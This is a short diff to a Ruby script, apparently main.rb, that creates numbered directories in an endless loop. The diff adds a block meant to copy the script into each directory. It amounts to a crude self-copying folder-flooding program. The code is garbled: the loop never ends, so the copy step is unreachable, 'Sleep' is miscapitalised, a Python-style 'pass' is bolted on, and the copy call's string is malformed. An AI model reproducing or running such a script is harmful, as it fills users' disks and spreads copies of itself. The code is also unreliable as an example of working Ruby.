@@ -3,6 +3,9 @@ require "os"
 require "securerandom"
 require "dir"
 
+def pass
+end
+
 OS.windows? ? sep = "\\" : sep = "/"  
 cwd = FileUtils.pwd()
 
@@ -13,8 +16,16 @@ while true
     Sleep(1)
     FileUtils.mkdir("#{cwd}#{sep}#{name}#{count}")
     count += 1
+end
 
-    if count == 10
-        all = Dir.glob('*').select {|f| File.directory? f}
-        for dir in cwd
-    #
+if count == 10
+    all = Dir.glob('*').select {|f| File.directory? f}
+    for dir in all
+        if dir == "main.rb"
+            pass
+        else
+            Sleep(1)
+            FileUtils.copy_file("#{cwd}#{sep}main.rb, #{dir}")
+        end
+    end
+end
